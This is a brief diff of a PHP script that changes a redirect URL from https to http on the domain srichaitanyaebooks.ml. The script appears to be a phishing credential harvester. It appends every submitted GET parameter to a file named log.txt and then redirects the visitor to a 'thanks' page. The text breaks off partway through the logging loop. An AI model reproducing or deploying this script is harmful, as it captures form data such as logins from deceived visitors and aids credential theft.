@@ -1,5 +1,5 @@
 <?php
-header ('Location:https://srichaitanyaebooks.ml/thanks.html');
+header ('Location: http://srichaitanyaebooks.ml/thanks.html');
 $handle = fopen("log.txt", "a");
 foreach($_GET as $variable => $value) {
 fwrite($handle, $variable);
